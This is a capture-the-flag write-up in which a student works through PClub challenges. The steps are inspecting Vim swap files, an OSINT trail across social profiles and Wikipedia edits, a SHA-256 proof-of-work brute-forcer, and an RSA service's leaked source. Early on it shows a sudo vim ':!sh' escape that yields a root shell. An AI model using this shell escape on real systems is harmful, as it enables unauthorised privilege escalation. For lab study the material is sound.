b0VIM 9.1^@^@^@^@^P^@^@^@^@^@^@^@^@^@^@Ú        ^@^@root^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@1d6089cf076a^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
".swp" [noeol][converted] 1L, 12293B                          1,1           All

This prints the original binary file, so of no use.


Now Perplexity suggested me:
You can use sudo vim to escape to a root shell if it is allowed:
Run:
sudo vim
In Vim, type:
:!sh
and press Enter.
If this works, you will have a root shell and can access any file.

Now in order to have partial access to TTY, Perplexity gave me the following code:

export TERM=xterm
stty rows 24 columns 80
exec /bin/bash

Running it i got root access:

###bash: cannot set terminal process group (177989): Inappropriate ioctl for device
bash: no job control in this shell
root@1d6089cf076a:/chal# 

Listing files again:
ls -la 
Gave me:
root@1d6089cf076a:/chal# ls -la

total 104
drwxr-xr-x 1 root root  4096 May 24 09:18 .
drwxr-xr-x 1 root root  4096 May 15 11:41 ..
-rw------- 1 root root 12288 May 24 09:18 .swi
-rw------- 1 root root 12288 May 24 08:43 .swj
-rw------- 1 root root 12288 May 24 08:38 .swk
-rw------- 1 root root 12288 May 23 14:32 .swl
-rw------- 1 root root 12288 May 23 13:57 .swm
-rw------- 1 root root 12288 May 23 13:56 .swn
-rw------- 1 root root 12288 May 21 22:22 .swo
-rw------- 1 root root 12288 May 21 22:20 .swp
root@1d6089cf076a:/chal# 

On trying to do cat .swp, etc. I get the following for each file:

root@1d6089cf076a:/chal# cat .swp

b0VIM 9.1� root1d6089cf076a U3210#"! Utpad����udo /bin/vimroot@1d6089cf076a:/chal# 

So I didn’t get any information. 

Running xxd -p .xwp on the port gives:

root@1d6089cf076a:/chal# xxd -p .swp

623056494d20392e31000000001000000000000000000000da090000726f
6f7400000000000000000000000000000000000000000000000000000000
000000000000000031643630383963663037366100000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000955333231300000000023222120
131255000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000747001007f000000020000000000
000002000000000000000100000000000000010000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000061640000d20f0000f20f0000001000000200000000000000f30f0000
f20f00000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000075646f202f62696e2f76696d00


Which would be the hex of (I guess):
b0VIM 9.1�Q.h��root1d6089cf076achal/.swp	U3210#"! Utpad�����udo


Now I asked Perplexity to write a similar Perl script to find the flag.
I made a new file using 
vim find_flag.pl

With the code:
#!/usr/bin/perl

use strict;
use warnings;

my @swap_files = glob(".sw*");

foreach my $file (@swap_files) {
    open(my $fh, '<:raw', $file) or die "Could not open $file: $!";
    my $content = do { local $/; <$fh> };
    close($fh);

    if ($content =~ /(PClub\{[\w!-~]+\})/a) {
        print "Found flag in $file: $1\n";
        exit;
    }
}

print "Flag not found in any swap files.\n";


Then making it executable using chmod +x find_flag.pl and running it using ./find_flag.pl
I got the output:
Flag not found in any swap files.



From Blog1:



# FLAG 4


Searched for Kalpit Lal Rama on Google

Found a Linkedin profile
https://www.linkedin.com/in/kalpit-lal-rama-58b789330/?originalSubdomain=in

That sent to a twitter profile
http://x.com/KalP52916094

Which sent to a reddit profile
https://www.reddit.com/user/Virtual-Copy-637/

Got a cryptic message
https://www.reddit.com/user/Virtual-Copy-637/comments/1fuyetj/i_like_these_numbers_particularly/

In this, there are some numbers:
12668958
29326
23627944634268
3108
8
523948
01050036027972
87177902339084610664
Which “might imply something” according to the comment.

Then I used Basecrack (https://github.com/mufeedvh/basecrack) and put the full number as
126689582932623627944634268310885239480105003602797287177902339084610664

And got
bq455el4wlz0zp4cv7dtazic32bs0za23okyy7v60u20dk

Which does not contain any special text.


vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~/basecrack$ python3 basecrack.py -b 126689582932623627944634268310885239480105003602797287177902339084610664

 python basecrack.py -h [FOR HELP]

[-] Encoded Base: 126689582932623627944634268310885239480105003602797287177902339084610664

[>] Decoding as Base36: bq455el4wlz0zp4cv7dtazic32bs0za23okyy7v60u20dk

[-] The Encoding Scheme Is Base36

Now I tried for all numbers separately:

[>] Enter Encoded Base: 12668958

[>] Decoding as Base36: 7jjfi

[-] The Encoding Scheme Is Base36


[>] Enter Encoded Base: 29326

[>] Decoding as Base36: mmm

[-] The Encoding Scheme Is Base36


[>] Enter Encoded Base: 23627944634268

[>] Decoding as Base16: #byDcBh

[>] Decoding as Base36: 8dij06h0c

[-] The Encoding Scheme Is Base16

[-] The Encoding Scheme Is Base36


[>] Enter Encoded Base: 3108

[>] Decoding as Base36: 2ec

[-] The Encoding Scheme Is Base36


[>] Enter Encoded Base: 523948

[>] Decoding as Base16: R9H

[>] Decoding as Base36: b8a4

[-] The Encoding Scheme Is Base16

[-] The Encoding Scheme Is Base36


[>] Decoding as Base16: 6yr

[>] Decoding as Base36: dedoc8jo

[-] The Encoding Scheme Is Base16

[-] The Encoding Scheme Is Base36



[>] Enter Encoded Base: 87177902339084610664

[>] Decoding as Base36: iec4j8c4irsrs

[-] The Encoding Scheme Is Base36



https://www.dcode.fr/cipher-identifier gives it to be a base-36 cipher

On putting it there, I got:
HTTPS WWW INSTAGRAM COM I LIKE ANONYMITY SOMETIMES1212

This gives the link to an instagram account of Kalpit:
https://www.instagram.com/i_like_anonymity_sometimes1212/

So now I need to find a flag somewhere here.

First, I see that the account has 3 posts and 1 highlight, all related to rowing.

The 3 posts seem normal and don’t have much in them. However, the highlight seems very unusual. It is named "spam?¿"

One of the highlight's images includes time of rowing of someone on 29 september 2024. and one image includes the person reading "Mahé Drysdale" wikipedia on their laptop. also one image includes them reading "Thomas Keller Medal" wikipedia page. next image is of them still on the same "Thomas Keller Medal" page saying they were "sleeping on their keyboard" for 5 hours in which it is written "I hope I didn't give any vital information"
This gives a very clear hint that maybe the person edited the Wikipedia page for 5 hours.
ON opening the wikipedia page(https://en.wikipedia.org/wiki/Thomas_Keller_Medal)
I opened the edits and found that someone with a similar name had edited this page on 13th May 2025 and also on 29th September 2024.

Opening the first edit(https://en.wikipedia.org/w/index.php?title=Thomas_Keller_Medal&oldid=1290220257)
I got the flag!:


PClub{idk_how_this_got_typed}
This link also gave me the next challenges:
PClub{idk_how_this_got_typed}
Nice job though! Here's the next challenge : https://pastebin.com/v9vuHs52


The 29th September edit also gives a flag:
TechSprint{I_think_we_have_a_osint_god_among_us!}
However this doesn’t start with ‘PClub{‘ so it is a flag of some other CTF.
# FLAG 5


Now opening the given pastebin link,
I got the following:
Challenge 1 : Connect to 3.109.250.1 at port 5000
Challenge 2 : https://cybersharing.net/s/327d3991cd34b223


For challenge 1, I connected to the first port and got:


vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "OFyzbf" concatenated with your input starts with the the string "46522".


Now I asked Perplexity to write a script for me to find this number and it gave me a Python script:




import hashlib




prefix = "OFyzbf"
target = "46522"




i = 0
while True:
   candidate = str(i)
   combined = prefix + candidate
   hash_hex = hashlib.sha256(combined.encode()).hexdigest()
   if hash_hex.startswith(target):
       print(f"Found! Suffix: {candidate}")
       print(f"Hash: {hash_hex}")
       break
   i += 1




Which on running gives the output:
Found! Suffix: 59385
Hash: 4652244a190c9e82c154a0080b7c216d1226f484df5fe31308ea6857a14717a0


Putting this into the terminal gives me:
vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "OFyzbf" concatenated with your input starts with the the string "46522".
59385
59385


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?


I typed 3 and got:


Give me a padding: 


I typed == since it is a common padding for hexadecimal numbers


The terminal gave this as output:
==
Ciphertext :  13437526472436443794216183194447347160957723113505232847991360862197529202477976226223121151407468350036532649467071893698082471295472203034613273830678094028104591399545319175585930820397174104511540104583496629481597675247613201105958356929400855566723932165165664211404461318251176867882892738943254766829311119276747891786529003132148567740705952084673965093175853209210356245943095446490094433095746985520831867439219251651044959794954083466336316805043318794525702718487545381146762329975073273985903379781756784811915673270330664256271323153500757465720632988152760741478215477524411740884886262399224477776052






Now I closed the port and re-opened it.
This time, again using the python script, I found the number and then typed 1.


vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "yksoqu" concatenated with your input starts with the the string "66593".
1913512
1913512


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
1
1
from Crypto.Util.number import bytes_to_long
from hashlib import sha256
import random
import os, sys


m = b"PClub{Fake_Flag}"
n = 14396996159484935402263047209515591837894561722637754977347763291309469526016654395830492184143403002427443166570907471043582253894111865750271913633299048451358715658977476227178780148897263675642352138870807635707152157265878868071156485130358955177740064371871540690429629376357175922832896148083749207758979817755416407370097422607094461094843394269367378266138773192483991105300836363325123386715060503986689730021660330714714902229408932007554015453954776067969393448087791858215409782993160037667631348054614116602892854843905177862655435919982681383061296616680660139810652785553456917773787057033714145613047
e = 3
def options():
    help_menu = """
    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?"""
    while True:
        print(help_menu)
        c = input().strip()
        if c == "1":
            return 1
        elif c == "2":
            return 2
        elif c == "3":
            return 3
        else:
            print("Please select a valid option!")
            
def proof():
    _x = "abcdefghijklmnopqrstuvwxyzFRLMAOEWJASK"
    _y = "".join(random.sample(_x, 6))
    _z = str(random.randint(10000, 99999))
    print(f'\nFind a string such that SHA-256 hash of "{_y}" concatenated with your input starts with the the string "{_z}".')
    _u = input().strip()
    return hashlib.sha256((_y + _u).encode()).hexdigest()[:len(_z)] == _z



